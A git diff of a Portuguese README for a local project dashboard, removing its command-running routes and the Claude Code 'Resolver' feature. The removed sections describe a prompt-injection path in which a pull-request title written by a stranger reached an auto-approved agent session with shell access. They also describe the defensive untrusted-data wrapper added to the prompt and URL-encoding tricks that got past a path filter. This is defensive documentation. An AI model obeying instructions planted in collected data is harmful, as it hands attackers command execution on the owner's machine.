@@ -26,23 +26,24 @@ Sem build, sem `npm install`, sem dependência externa. Precisa de Python 3.12,
 | Arquivo | Papel |
 |---|---|
 | `index.html` | A tela. Recarrega sozinha a cada 15 s. |
-| `servir.py` | Serve a página, o `/api/dados`, o `/api/acao` e o `/api/execucao`. Agenda as três coletas. |
+| `servir.py` | Serve a página e o `/api/dados`. Agenda as três coletas. **Não executa comando** — ver a seção abaixo. |
 | `banco.py` | O SQLite (`hub.db`): uma linha por (projeto, camada), com carimbo de tempo. |
 | `regras.py` | O motor das 18 pendências, mais o agrupamento das repetidas. Puro: entra dicionário, sai lista. |
 | `memoria.py` | A memória do tempo: idade de cada pendência, tendência da semana e o briefing. |
 | `test_memoria.py` | 46 testes da memória. `python test_memoria.py`. |
-| `execucao.py` | O botão **Resolver**: dispara uma sessão do Claude Code numa cópia isolada e abre o pedido de alteração. Seção própria abaixo. |
-| `test_execucao.py` | 90 testes das decisões do Resolver e das barreiras. `python test_execucao.py`. |
+| `execucao.py` | O antigo botão **Resolver**. **Sem rota apontando para ele** desde a etapa 7 — fica no repositório de propósito. |
+| `test_execucao.py` | 90 testes das decisões do Resolver e das barreiras, todos verdes. `python test_execucao.py`. |
 | `barreira.py` | O porteiro do `Bash` da sessão desacompanhada: roda como hook do `claude` e barra o comando **antes** dele rodar. |
 | `test_barreira.py` | 36 testes da barreira — cada um é um ataque concreto ou um comando honesto. `python test_barreira.py`. |
 | `test_regras.py` | 67 testes do motor. `python test_regras.py`. |
-| `test_servir.py` | 46 testes do proxy do grafo e da superfície do Resolver. `python test_servir.py`. |
-| `coletar.py` | Camada **local**: git, Docker, portas, grafo, memória, variáveis. |
+| `test_servir.py` | 6 testes: a linha de comando, e o amarre entre o que a tela busca e o que o servidor serve. `python test_servir.py`. |
+| `test_rotas.py` | 8 testes — **o vigia**: importa `servir` e prova que nenhuma rota executa comando. `python test_rotas.py`. |
+| `coletar.py` | Camada **local**: git, Docker, portas, idade do grafo, memória, variáveis. |
 | `coletar_github.py` | Camada **github**: CI, PRs, alertas, o site no ar e o último deploy. Uma consulta GraphQL em lote. |
 | `test_coletar.py` | 94 testes dos pedaços dos coletores que já erraram. `python test_coletar.py`. |
 | `coletar_pesado.py` | Camada **pesado**: cota do Actions e `npm audit`. |
 | `test_coletar_pesado.py` | 12 testes da auditoria de dependência. `python test_coletar_pesado.py`. |
-| `fila.py` | A fila desacompanhada: escolhe a pendência, escolhe o trilho e segura o teto de gasto do dia. |
+| `fila.py` | A fila desacompanhada. **Sem rota apontando para ela** desde a etapa 7 — fica no repositório de propósito. |
 | `test_fila.py` | 92 testes da fila. `python test_fila.py`. |
 | `casos.json` | Camada **curada**, escrita à mão. Nenhum coletor toca aqui. |
 
@@ -50,9 +51,66 @@ Sem build, sem `npm install`, sem dependência externa. Precisa de Python 3.12,
 25/08/2026, também zera a memória do tempo, que se reconstrói sozinha a partir da
 coleta seguinte.
 
-**483 testes no total**, todos em `unittest` da biblioteca padrão, e todos os oito
+**468 testes no total**, todos em `unittest` da biblioteca padrão, e todos os oito
 arquivos rodam na CI. Passam em Windows e em Linux — verificado num contêiner
 `python:3.12-slim`, porque o núcleo vai rodar em Linux na VPS.
+
+## O servidor deixou de executar comando (etapa 7 do DERVS)
+
+Até 26/08/2026 este servidor executava. Havia `/api/acao`, que rodava
+`git push`, `docker compose up`, abria o VS Code e disparava uma sessão do
+Claude Code; havia `/api/execucao`, que transmitia o log dessa sessão; e havia
+um proxy que embutia a tela do grafo de código dentro da mesma origem.
+
+Nada disso foi endurecido. **Foi removido.** A razão é que o HUB vai deixar de
+ser um programa que só o dono roda na própria máquina, e código que executa
+comando não sobrevive a essa mudança.
+
+### O que ficou no lugar
+
+Uma tabela, `servir.ROTAS`, no fim do `servir.py`. Antes o despacho era uma
+cadeia de `if self.path…` espalhada por dois métodos, e ninguém conseguia
+responder "quais rotas este servidor tem?" sem ler o arquivo inteiro e torcer
+para não ter pulado um `if`. Agora a resposta cabe numa linha:
+
+```bash
+python -c "import servir; print(sorted(servir.ROTAS))"
+```
+
+```
+['/', '/api/dados', '/api/silenciar', '/favicon.ico', '/index.html',
+ '/painel-projetos.ico', '/painel-projetos.png', '/painel-projetos.svg']
+```
+
+### O vigia, e por que ele lê a memória e não o arquivo
+
+`test_rotas.py` **importa `servir` e itera a tabela em memória**. Um `grep` por
+`"/api/acao"` no texto do arquivo não veria uma rota montada por concatenação —
+`"/api/" + "exec" + "ucao"` — e essa rota executaria exatamente igual a uma
+escrita à mão. O vigia também reprova se `ROTAS` **não existir**, para que
+ninguém "conserte" o teste apagando a tabela.
+
+Provado pelos dois lados em 26/08/2026: no código são ele passa; nas três
+sabotagens (rota escrita à mão, rota por concatenação, e caminho de nome
+inocente apontando para função que executa) ele reprova as três.
+
+### `execucao.py` e `fila.py` continuam aqui, sem rota
+
+De propósito. Os dois somam 182 testes verdes, e a trava de diff de
+`fila.py:229` é uma das defesas do produto para a fatia seguinte. Apagá-los
+"já que estão sem uso" custaria as duas coisas. Eles não são importados pelo
+`servir.py`, e o vigia prova isso.
+
+### O que sumiu da sua tela
+
+O botão **Resolver**, a faixa da **fila**, a aba do **grafo de código**, os
+botões **"Medir agora"** e **"Atualizar GitHub"**, e as entradas da paleta que
+abriam o VS Code, subiam contêiner ou davam `git push`.
+
+O que ficou: o briefing, a caixa de pendências, o **x** que esconde um alerta
+por 24 h, a tabela dos 17 projetos, a paleta (só com o que abre link) e o tema.
+As três coletas seguem rodando sozinhas — 60 s, 20 min e 24 h —, então a tela
+continua se atualizando sem nenhum botão.
 
 ## As três cadências
 
@@ -89,6 +147,11 @@ medida e esmaece quando envelhece — se o painel mentir uma vez, o hábito morr
 | 17 | A auditoria de dependência tentou rodar e falhou | baixa | copiar o comando |
 | 18 | O git não respondeu por este projeto | média | copiar o comando |
 
+**A coluna "Ação" descreve a intenção, não um botão.** Desde a etapa 7, só
+viram botão as ações que o navegador faz sozinho — abrir um link e copiar um
+texto. "Subir", "abrir no VS Code" e "enviar ao GitHub" continuam sendo o que a
+pendência pede de você; a diferença é que agora quem faz é você, fora do painel.
+
 Três invariantes, cobertos por teste:
 
 1. **Toda pendência tem uma ação.** Sem o que fazer, não é pendência: é
@@ -110,115 +173,16 @@ ensinando o dono a ignorar a lista inteira.
 **Regra 6 existe porque o erro é calado.** Arquivo de memória em CRLF faz o
 harness ignorar o frontmatter, e a memória nunca carrega. Nada na tela avisa.
 
-## A fila que conserta — o painel deixa de só apontar
-
-Até aqui o painel apontava e você resolvia um item por vez, a dedo. A **fila**
-pega a lista de pendências, escolhe a ordem sozinha e trabalha desacompanhada
-até acabar serviço, dinheiro ou paciência. Ela só começa quando você aperta
-**"Trabalhar na fila"** — não há agendador, e isso é decisão, não pendência.
-
-### Três trilhos
-
-| Trilho | Quem faz | Custo | O que sai |
-|---|---|---|---|
-| **Renovate** | um robô do GitHub, fora do painel | grátis | pedido de alteração de dependência |
-| **Mecânico** | o próprio painel, sem IA | **R$ 0,00** | o arquivo corrigido, direto |
-| **Claude** | uma sessão do Claude em cópia sem acesso ao GitHub | pago, teto de US$ 3 por item — ou menos, se o dia ja gastou | pedido de alteração |
-
-**Estado em 25/08/2026 — o Renovate saiu do papel.** Está instalado em todos
-os repositórios da conta `garcia-goncalves` (plano Community, gratuito), em modo
-`Interactive`, e todo repositório novo entra sozinho. A configuração é **uma
-só** e vive em `garcia-goncalves/renovate-config`; cada repositório carrega
-apenas um `renovate.json` de três linhas apontando para lá. Ela é contida de
-propósito: as atualizações pequenas viram um pedido por semana, versão maior
-espera aprovação, e nada com menos de 24 horas de publicado é adotado — a janela
-em que um pacote comprometido ainda não foi despublicado. O motivo do aperto é a
-cota do GitHub Actions, medida em 88% (2.646 de 3.000 min em 30 dias).
-
-**Automesclagem, ligada em 25/08/2026 — e só onde ela significa alguma coisa.**
-Correção de falha de segurança pequena (`patch` e `minor`) entra sozinha quando
-a CI fica verde; versão maior nunca entra sozinha. A regra vive no preset
-central, mas **seis dos dez repositórios a desligam** por escrito no próprio
-`renovate.json`, e o motivo está lá dentro: em `fristachiodontologia` e
-`medconsultoria-crm` não existe CI nenhuma, então "CI verde" seria uma frase
-vazia — mesclar sem verificação alguma; em `medconsultoria`, `odontologia-pericia`,
-`ccvp-painel` e `zacareli` o deploy dispara em `push` na `main`, então
-automesclar não seria mesclar, seria **publicar em produção sem ninguém olhar**.
-Sobram quatro onde a automesclagem é honesta: `painel-projetos`, `investrix`,
-`grimoire` e `workspace-medconsultoria` — todos com CI rodando em `pull_request`
-e deploy só por botão. Quem ganhar CI, ou trocar o deploy por botão, apaga o
-bloco do seu `renovate.json` e volta ao padrão da organização.
-
-Só **três** das 18 regras entram na fila: `memoria_crlf` (mecânico),
-`env_drift` e `dependencia_insegura` (Claude). É lista **branca**: regra que não
-está lá não chega ao motor, nem por engano.
-
-**A fila só existe porque as barreiras existem.** Sem ninguém olhando a tela, a
-sessão do Claude deixa de ser uma ferramenta vigiada e passa a ser um programa
-solto na sua máquina. As três barreiras — cópia sem acesso ao GitHub, sessão sem
-configuração de arquivo, e lista de comandos — estão descritas em "O que este
-recurso NÃO isola", inclusive no que elas **não** cobrem.
-
-**`ci_vermelha` fica de fora de propósito.** É o caso mais valioso e o único em
-que *apagar o teste parece uma correção*. Enquanto a trava do teste apagado não
-tiver histórico de acerto, ela não entra.
-
-**`grafo_velho` fica de fora porque não cabe.** A ação dela hoje é copiar um
-texto para você colar; reindexar acontece pelo MCP do grafo, e o painel não
-dirige o MCP — ele só serve a tela do grafo por procuração.
-
-### As quatro travas, todas verificadas em código
-
-Nenhuma delas é uma instrução no texto do pedido. Instrução em texto é sugestão;
-trava é código que recusa.
-
-1. **Teto de R$ 50 por dia.** No ponto exato do teto já não cabe mais um item.
-   "Só mais um" é como conta de R$ 300 acontece. O teto do dia limita o teto
-   **da sessão** (`fila.teto_da_sessao`): com R$ 49 gastos, a sessão sai com
-   teto de R$ 1, e não com os R$ 15,42 de sempre. Sem isso — e era assim até
-   25/08/2026 — a fila conferia o teto *antes* do item e o dia podia fechar
-   em R$ 64 sem nunca ter "estourado". O botão **Resolver** também conta:
-   ele dispara a mesma sessão e o custo dele entra na tabela `gasto`, que
-   `banco.gasto_entre` soma junto com a fila.
-2. **Anti-laço: duas tentativas por item**, e falha de hoje não volta hoje. Uma
-   correção que não pega vira torneira aberta de madrugada.
-3. **Teste apagado.** Antes de publicar, o painel lê o diff. Apagou um arquivo
-   de teste (`test_*.py`, `*_test.*`, `*.test.*`, `*.spec.*`) ou desligou um
-   teste (`@unittest.skip`, `pytest.mark.skip`, `it.skip(`, `xit(`…)? Reprovado.
-   **Tirar** um skip passa de propósito: religar um teste é o oposto de burlar.
-4. **Segredo no arquivo de exemplo de ambiente.** Linha nova só pode ser
-   `CHAVE=`. Com qualquer coisa depois do `=` — inclusive um espaço reservado
-   que pareça inofensivo — o item é reprovado. O custo de errar para o lado
-   frouxo é um segredo no histórico do git, e rotacionar segredo é varredura no
-   repositório inteiro, não a edição de uma linha.
-
-As travas 3 e 4 ficam no **último instante antes de publicar**, dentro do
-`execucao.py`, porque é o único ponto por onde todo caminho passa — botão,
-paleta e fila.
-
-### O teto usa a data local, não a UTC
-
-O resto do banco carimba em UTC. O teto, não. Em UTC−3, às 21h de terça já é
-quarta em UTC: o teto zeraria três horas cedo e a surpresa seria de madrugada,
-sem ninguém entender por quê.
-
-**Risco aceito:** o `hub.db` é descartável. Apagar o banco no meio do dia zera o
-gasto acumulado e devolve os R$ 50 inteiros. É ato deliberado seu, não acidente
-— fica registrado aqui e não vira código.
-
-### O que a regra 6 (CRLF) deixou de apontar
-
-O `MEMORY.md` saiu do varredor. O motivo da regra é *"em CRLF o harness ignora o
-frontmatter e a memória nunca carrega"* — e esse arquivo, por especificação,
-**não tem** frontmatter: ele é o índice, uma linha por memória. Não há cabeçalho
-para ser ignorado, logo não há falha a apontar. Conferido em 25/08/2026: dos 13
-arquivos `.md` da pasta de memória deste projeto, ele é o único sem `---`.
-
 ## A paleta de comandos (`Ctrl+K`)
 
 Uma porta de entrada só. `Ctrl+K` (ou `Cmd+K`) abre uma caixa de busca; digitar
-`dents` cai no projeto, digitar `subir` sobe contêiner, digitar `grafo` abre a
-aba do mapa de código. Com 17 repositórios, menu em árvore vira caça ao tesouro.
+`dents` acha o projeto e os endereços dele. Com 17 repositórios, menu em árvore
+vira caça ao tesouro.
+
+**A etapa 7 esvaziou boa parte dela**, e de propósito: "abrir no VS Code",
+"subir os contêineres" e "enviar ao GitHub" rodavam programa na sua máquina e
+saíram junto com as rotas. O que sobrou abre link — e link o navegador abre
+sozinho.
 
 O botão **"Buscar projeto ou ação  `Ctrl K`"** fica visível no cabeçalho de
 propósito: atalho que só existe no teclado é atalho que ninguém descobre.
@@ -227,14 +191,13 @@ propósito: atalho que só existe no teclado é atalho que ninguém descobre.
 
 Hoje são ~76 comandos, montados a cada abertura a partir do que a tela já sabe:
 
-1. **Toda pendência da caixa**, com a ação dela pronta (as urgentes vêm com selo
-   vermelho).
+1. **As pendências da caixa cuja ação o navegador faz sozinho** — abrir um link
+   ou copiar um texto. As demais não entram: a paleta não pode oferecer o que o
+   botão não oferece mais.
 2. **Cada projeto**, com as portas de entrada que **existem** para ele: abrir no
-   VS Code, subir os contêineres (só se tem compose), enviar ao GitHub (só se há
-   commit parado), abrir no GitHub, abrir o site no ar (só se tem `url_prod`),
-   abrir o endereço local (só se a porta está viva de fato).
-3. **Comandos da máquina**: medir de novo, atualizar GitHub, abrir o grafo,
-   trocar o tema.
+   GitHub, abrir o site no ar (só se tem `url_prod`), abrir o endereço local (só
+   se a porta está viva de fato).
+3. **Comandos da máquina**: trocar o tema.
 
 Item que abre nada é pior que item ausente, então nada entra "por via das
 dúvidas".
@@ -247,22 +210,21 @@ são ignorados dos dois lados — `ajudei saude` acha `Ajudei-Saúde`, que é co
 uma pessoa digita.
 
 Uma regra de desempate merece explicação. Digitar o **nome inteiro** de um
-projeto põe *"Abrir no VS Code"* em primeiro, mesmo havendo pendência desse
-projeto — quem digita `dents` quer o dents. Mas digitar **letras soltas** deixa a
+projeto põe as entradas daquele projeto em primeiro, mesmo havendo pendência
+dele — quem digita `dents` quer o dents. Mas digitar **letras soltas** deixa a
 pendência urgente ganhar: ali o dono não sabe o nome, está procurando o que
 precisa dele. É o `BONUS_NOME` no `index.html`.
 
 ### O que ela deliberadamente não faz
 
 **A paleta não tem ação própria nenhuma.** Ela encontra e dispara o que já
-existe: mesma função `agir()` (ou `resolver()`, para o botão Resolver), mesma
-lista branca do `servir.py`. Digitar `resolver` acha
-"Resolver com o Claude: …" para cada pendência que pode ser resolvida — é a
-mesma função do botão, não uma segunda porta com regra própria. Se pudesse
-fazer algo que a tela não faz, viraria uma segunda superfície de risco para
-revisar a cada mudança. Um teste amarra isso (`PaletaNaoInventaComando`, no
-`test_servir.py`): ele lê os comandos que o `index.html` manda e exige que cada
-um exista no servidor.
+existe: mesma função `agir()`, e a mesma decisão de `temAcaoNaTela()` que a
+caixa usa para desenhar o botão. Se pudesse fazer algo que a tela não faz,
+viraria uma segunda superfície de risco para revisar a cada mudança.
+
+Dois testes amarram isso: `ATelaSoChamaRotaQueExiste` (em `test_servir.py`)
+cruza cada `fetch()` do `index.html` com a tabela `servir.ROTAS`, e o vigia do
+`test_rotas.py` prova que essa tabela não tem nada que execute comando.
 
 ### Detalhes de implementação
 
@@ -378,62 +340,23 @@ Dois casos merecem leitura, porque **não** são inflação:
   0% aqui não é "projeto péssimo", é "quase nada a medir". Se incomodar, o
   caminho é tirar a pasta de `source/`, não afrouxar a régua.
 
-## O grafo de código embutido
-
-A aba **Grafo de código** mostra o mapa de funções, chamadas e dependências dos
-seus projetos, servido dentro do próprio HUB em `/grafo/*`. São três coisas
-distintas, e vale entender por quê.
-
-**a) Ele não é um servidor independente.** A porta 9749 é a tela de um servidor
-MCP que fala por `stdin`. Medido em 24/08/2026: com o `stdin` fechado, o
-processo registra `ui.serving` e em seguida `server.shutdown` **no mesmo
-segundo** — a porta abre e fecha, e a tela fica em branco sem erro nenhum. O que
-o segura de pé é o cano de entrada **aberto**. Por isso o botão **Ligar o
-grafo** guarda o processo em `_grafo_proc` e nunca fecha esse cano.
-
-Consequência aceita de propósito: **o grafo vive enquanto o HUB viver, e morre
-junto**. É melhor que a alternativa — este binário já congelou a máquina duas
-vezes por consumo de memória, e processo órfão ninguém lembra de matar.
-
-**b) Quatro estados na tela**, não dois:
-
-| Estado | O que aparece |
-|---|---|
-| No ar | o grafo, embutido |
-| Fora do ar | cartão com o botão **Ligar o grafo** |
-| Subindo | contador; a tela aparece sozinha quando ele responder |
-| Sem o programa | cartão explicando que não há o que ligar |
-
-**c) Montagem preguiçosa.** O quadro do grafo **não existe no DOM** até você
-clicar na aba. Grafo pesado dentro de painel é a receita clássica de painel que
-demora a abrir.
-
-### O que o proxy precisa reescrever, e por quê
-
-A tela do grafo pede caminho **absoluto**: `/api/...`, `/assets/...` e `/rpc`.
-Servida sob `/grafo/`, ela pediria `/api/index-status` na raiz do HUB — onde
-mora o `/api/dados` do painel. Por isso o proxy reescreve o corpo de texto.
-
-O defeito que só o navegador mostrou (24/08/2026): a primeira versão cobria
-apenas aspas simples e duplas, mas a tela monta `` `/api/layout?...` `` e
-`` `/api/browse${...}` `` **com crase**. Resultado: a visualização do grafo
-respondia `HTTP 404` sem dizer de onde vinha. A reescrita cobre as três aspas —
-e de propósito **não** toca `` `/${e}` ``, que no mesmo pacote junta caminho de
-pasta, não URL.
-
 ## Segurança
 
-O servidor executa `git push`, `docker compose up` e abre o VS Code. Escutar só
-em `127.0.0.1` protege contra a rede, mas não contra o navegador do próprio dono:
-qualquer site aberto em outra aba pode disparar um POST para `localhost:4777`.
-Por isso toda ação exige as três coisas:
+**Este servidor não executa comando.** Ele já executou, e a seção acima conta o
+que saiu e por quê.
+
+Sobrou uma rota de escrita, `/api/silenciar`, que grava uma linha no banco.
+Escutar só em `127.0.0.1` protege contra a rede, mas não contra o navegador do
+próprio dono: qualquer site aberto em outra aba pode disparar um POST para
+`localhost:4777`. Por isso ela ainda exige as três coisas:
 
 1. um **token** sorteado a cada inicialização, injetado apenas na página servida;
 2. cabeçalho `Origin` da própria origem;
 3. cabeçalho `Host` de `localhost` (barra DNS rebinding).
 
-E o cliente **nunca manda caminho** — manda o nome do projeto, e o caminho vem do
-banco. Não existe ação que rode em pasta escolhida por quem chamou.
+O pior que um pedido forjado consegue ali é esconder um alerta da sua tela por
+até 30 dias — e isso se desfaz sozinho. O par continua exigido mesmo assim,
+porque o alerta escondido pode ser um alerta de segurança.
 
 O servidor publica **só** a página e os três arquivos de ícone. Todo o resto
 responde 404, e `HEAD` responde 405 — sem isso ele caía no handler de arquivos
@@ -442,72 +365,6 @@ padrão e revelava existência, tamanho e data de qualquer arquivo da pasta — 
 **Segredo nenhum entra no banco ou na tela.** O coletor abre o arquivo de
 variáveis só para extrair **nomes** de variável. Quem autentica no GitHub é o
 `gh` que o dono já logou.
-
-### A rota do botão "Resolver" (`/api/execucao`)
-
-`resolver` e `parar` entram pelo **mesmo** `/api/acao` de sempre, e portanto pela
-mesma cadeia de três checagens acima — nada foi afrouxado para eles. Quem recusa
-uma pendência que não pode ser resolvida é o **servidor**, não a tela: esconder o
-botão é conveniência, a barreira é `execucao.pode_resolver`.
-
-A consulta do progresso é um **GET** (`/api/execucao?desde=N`), e aí há uma
-diferença que precisa ser dita, senão parece um afrouxamento: o navegador **não
-manda `Origin` em GET de mesma origem**. Uma rota GET que exigisse `Origin`
-responderia 403 para sempre. Ela exige, em vez disso, `Host` de `localhost`, o
-**token** (igual ao POST) e `Sec-Fetch-Site` de mesma origem — exatamente o par
-que o proxy do grafo já usa, e pelo mesmo motivo.
-
-**O que este recurso acrescenta de superfície, dito sem maquiagem:** o servidor
-passa a executar `claude`, `git push` de um ramo novo e `gh pr create`. O prompt
-vai por **entrada padrão**, nunca pela linha de comando — nesta máquina `claude`
-é um `.CMD`, e todo argumento de um `.CMD` passa pelo interpretador do Windows.
-E a sessão filha herda os hooks do dono: ver "O que este recurso NÃO isola".
-
-### O preço de embutir o grafo na mesma origem
-
-Mesma origem faz sumir de uma vez o `SameSite` dos cookies e o CORS, mas cobra:
-um quadro de mesma origem **lê o DOM da página que o contém**, inclusive o token
-de ação. Isso é **aceito conscientemente** — o binário do grafo já roda como MCP
-com acesso total ao código e ao disco desta máquina, e o token só acrescenta
-`git push`, `docker compose up` e abrir o VS Code, que qualquer processo local
-já faz.
-
-Quem resolve o enquadramento não é a mesma origem: é o proxy **não repassar
-`frame-ancestors`**. O fornecedor do grafo manda `frame-ancestors 'none'` — uma
-recusa explícita de ser embutido — e este desenho a contorna por conta própria.
-Fica registrado aqui, não escondido no código.
-
-O que **não** é aceito, e por isso é barrado:
-
-- **Pedido vindo de outro site**, seja `GET` ou `POST`: o proxy exige
-  `Sec-Fetch-Site: same-origin`, cabeçalho que navegador nenhum deixa
-  JavaScript forjar. Até a revisão de 24/08/2026 isso valia só para o `POST`, e
-  qualquer aba aberta do dono podia varrer a API do grafo por `GET` — inclusive
-  a rota que **lista pasta do disco**.
-- **`/api/process-kill` não passa**, nem disfarçado. Comparar texto cru não
-  bastava: `%65`, `//`, `/./` e `#` furavam o filtro, porque quem decide o que
-  esses caracteres significam é o servidor de destino. Agora o caminho é
-  decodificado e normalizado **antes** de comparar.
-- **A política de segurança do fornecedor volta para o navegador.** O proxy
-  descartava a `Content-Security-Policy` do grafo, e o código de terceiro
-  passava a rodar **sem política** na origem que guarda o token. Isso importa
-  menos pelo binário (que já tem o disco inteiro) e mais pelo que ele
-  **indexa**: nome de função e caminho de arquivo vindos de um repositório
-  hostil são desenhados por essa tela. Agora a política é repassada inteira,
-  menos `frame-ancestors`, mais `X-Content-Type-Options: nosniff`.
-- **O token não vaza para o grafo.** Sobem apenas `Accept` e `Content-Type`, já
-  achatados numa linha; `X-Token`, `Cookie`, `Authorization` e `Origin` ficam.
-- **`/grafo/../api/dados` é recusado**, não normalizado.
-- **Resposta comprimida vira erro 502**, não tela em branco. O proxy não pede
-  compressão, mas isso é suposição sobre binário de terceiro: se ele comprimir
-  mesmo assim, reescrever produziria lixo rotulado como JavaScript, e a tela
-  ficaria branca sem log nenhum.
-
-Uma alternativa que **não** foi tomada, e vale saber que existe: servir o proxy
-numa **origem separada** (uma segunda porta atendendo só `/grafo/*`). O quadro
-deixaria de ser mesma origem e perderia o acesso ao token, ao custo de ~10
-linhas e de mais uma porta na máquina. Com a política do fornecedor restaurada,
-o ganho ficou pequeno o bastante para não pagar o preço agora.
 
 ### O que a revisão de segurança pegou (24/08/2026, antes de ir para a `main`)
 
@@ -528,220 +385,6 @@ o ganho ficou pequeno o bastante para não pagar o preço agora.
   próprio vigia grava em `~/.claude/state/vigia`: mesma verdade, zero execução.
 - **Nome de repositório remoto** é validado contra o alfabeto do GitHub antes de
   entrar na consulta GraphQL.
-
-## O botão "Resolver" — o Claude dentro do painel
-
-Cada pendência que tem projeto ganha, **ao lado** da ação de sempre, um botão
-`Resolver`. Ele dispara uma sessão do Claude Code que tenta corrigir a causa da
-pendência e termina abrindo um **pedido de alteração** (pull request) no GitHub.
-
-O cano inteiro, em seis passos:
-
-1. O navegador manda **só o `id`** da pendência. O servidor **recalcula** a
-   pendência a partir do banco (`_pendencia_por_id`) e ignora todo o resto do
-   corpo. Isso fecha o prompt para o navegador — mas **não** para o mundo: o
-   banco guarda o que o coletor leu da API do GitHub, e ali há texto que
-   estranhos escreveram. Ver "O texto de estranho que quase virou comando".
-2. O painel cria uma **cópia isolada** do repositório — um `git clone` local
-   com o `origin` **removido** — em
-   `~/.cache/hub-worktrees/<projeto>/<8 caracteres>`, de propósito **fora** de
-   `source\repos`, porque toda subpasta daquela raiz vira projeto medido e o
-   painel passaria a medir as próprias cópias. Até 25/08/2026 isso era um
-   `git worktree`, e a diferença não é de detalhe: ver
-   "O que este recurso NÃO isola".
-3. A sessão roda **dentro da cópia**. A pasta original do projeto não é tocada,
-   e `git status` nela continua vazio durante e depois.
-4. O painel lê a saída linha a linha e mostra o progresso ao vivo: uma frase em
-   português, o log cru com carimbo de hora, e o custo.
-5. Terminou bem: commit **na cópia**; o painel traz o ramo para o projeto de
-   verdade com `git fetch`, e só então faz `git push` de um ramo `hub/...` e
-   `gh pr create`. O push sai do **painel**, nunca da sessão — a cópia não tem
-   para onde empurrar. **Nunca** `push` na `main`, **nunca** `gh pr merge`.
-5b. **Parar sem confirmação não libera a vez.** Se o `Parar` pede a morte e o
-   processo não responde em 5 segundos, o painel **guarda** a referência dele em
-   vez de descartá-la, e recusa um novo `Resolver` enquanto aquele processo
-   respirar. A versão anterior largava a referência: o `claude` seguia vivo
-   cobrando na API, sem ninguém para matá-lo, e um segundo clique subia uma
-   sessão paralela cobrando junto. Pela mesma razão, se a leitura da saída morre
-   no meio, o painel mata a árvore do processo antes de marcar falha.
-6. Sucesso **descarta** a cópia; falha **preserva** a cópia em disco, para o
-   dono poder olhar o que aconteceu.
-
-Só há **uma execução por vez na máquina inteira**. A trava mora no servidor, não
-no navegador: fechar a aba, recarregar a página ou abrir outra não perde nada nem
-libera uma segunda sessão.
-
-### O que se vê na tela
-
-O botão abre um `<dialog>` que mostra, enquanto roda: a **frase de status** em
-português, o **log cru** com carimbo de hora, o **custo** e o botão **Parar**. A
-tela pergunta ao servidor de 1 em 1 segundo, mandando quantas linhas já tem, para
-receber só o que falta.
-
-Quando termina bem: o **link do pedido de alteração** e duas abas —
-**Resumo** (uma frase por arquivo tocado, escrita pela própria sessão) e
-**Diff**. As abas **não fazem requisição nenhuma**: os dois textos já vieram
-juntos no estado final.
-
-Três comportamentos que valem dizer:
-
-- **Fechar não para nada.** `Esc` fecha a janela; a sessão continua no servidor.
-  Enquanto ela roda, o botão daquela pendência vira **"Ver execução"**, e clicar
-  reconecta ao que está acontecendo — inclusive o log inteiro desde o começo.
-- **Os outros botões do painel continuam clicáveis.** O `Resolver` é um segundo
-  executor, ao lado do `agir()` de sempre, e de propósito **não** usa a trava
-  `ocupado` do cliente — essa trava agora é do servidor.
-- **O log não some.** O `recado()` do painel apaga em 4 ou 9 segundos; um log que
-  evapora enquanto o dono lê é pior que log nenhum.
-
-O botão aparece **só onde há o que resolver**: pendência sem projeto (a de cota
-do Actions nasce assim, de propósito) e projeto bloqueado ficam só com a ação de
-sempre. Um botão que existe para dizer "não" é o oposto do invariante "toda
-pendência tem uma ação".
-
-### O teto de gasto é aproximado, e isso não é força de expressão
-
-Medido nesta máquina em 24/08/2026: com `--max-budget-usd 0.10`, a execução
-terminou custando **US$ 0,44548** — estouro de 4,5×. A flag não é uma cerca; é
-um pedido. O teto adotado é **US$ 3** por execução — ou o que sobra do teto do dia,
-se for menos (`fila.teto_da_sessao`) — e a única garantia real de
-parar é o botão **Parar**, que mata a árvore de processos e espera 5 segundos
-pela confirmação. Se não confirmar, a tela diz que **não** confirmou — não finge
-que parou.
-
-O custo aparece em reais, por uma cotação constante no código
-(`execucao.USD_BRL`, R$ 5,14, fechamento de 21/08/2026). E ele **fica parado até
-a sessão terminar**: foi medido que só o evento final traz o custo. Inventar uma
-tabela de preços por token daria um número que se mexe e está errado.
-
-### Quando o pedido de alteração NÃO abre
-
-Três casos, cada um com uma tela própria — nenhum deles diz "algo deu errado":
-
-- **A sessão não mexeu em nada.** A tela diz "Terminou sem alterar nenhum
-  arquivo", e não finge que abriu pedido.
-- **O projeto não tem cópia no GitHub.** Sem `origin` não há para onde enviar. A
-  correção e o ramo ficam preservados no projeto, e a tela diz isso.
-  (Medido: o `medconsultoria-crm` está nesse caso.)
-- **O envio falhou.** A cópia é preservada com a mudança dentro, e o log cru do
-  `git`/`gh` aparece na tela.
-
-**Um detalhe que custou caro descobrir:** a sessão filha **commita por conta
-própria**. O prompt proíbe `push` e pull request, não commit. Por isso o painel
-não pergunta apenas "há arquivo alterado?" — ele compara o commit atual da cópia
-com o commit de onde ela partiu. Sem isso, uma correção já commitada era lida
-como "nada mudou", a cópia era descartada e a tela anunciava um pedido que nunca
-existiu. Achado na prova de aceitação de 25/08/2026, com uma execução real de
-R$ 10,37, e travado por teste (`HaOQuePublicar`).
-
-### O texto de estranho que quase virou comando
-
-Achado da revisão de segurança de 25/08/2026, corrigido antes de a entrega ser
-mesclada. Vale registrar inteiro, porque o desenho parecia seguro e não era.
-
-O prompt da sessão filha é um gabarito fechado com quatro campos. Um deles, o
-`detalhe` da pendência `pr_parado`, era o **título do pedido de alteração**,
-copiado cru da API do GitHub (`coletar_github.py`). Título de PR é escolhido por
-quem abre o PR — colaborador, fork de repositório público, automação de terceiro.
-
-O ataque completo, em quatro passos: a pessoa abre um PR com um título que é uma
-ordem disfarçada; espera sete dias, até a regra `pr_parado` acender no painel; o
-dono clica em `Resolver` naquela pendência; o texto dela entra no prompt de uma
-sessão que roda com `Bash`, `Write` e `Edit` **auto-aprovados**, com o login e os
-hooks do dono. Ou seja: comando arbitrário nesta máquina, com o `gh` já
-autenticado ao lado.
-
-Duas barreiras foram postas, e a primeira sozinha já fecha o buraco:
-
-1. **Campo de origem externa não entra no prompt.** O `detalhe` de `pr_parado`
-   passou a ser `pedido #N, parado ha D dias` — número e dias, calculados aqui.
-   O título continua a um clique de distância, no botão `Abrir`.
-2. **Defesa em profundidade, para a próxima regra que alguém escrever.** Os
-   campos `texto` e `detalhe` agora vão dentro de um bloco
-   `<dados-coletados-nao-confiaveis>`, com aviso explícito de que são dados e não
-   instruções, e passam por `so_dado()`, que neutraliza a etiqueta de fechamento
-   caso o próprio dado tente escrevê-la para sair do bloco.
-
-**A lição, que vale além deste recurso:** "o servidor recalcula do banco" não é
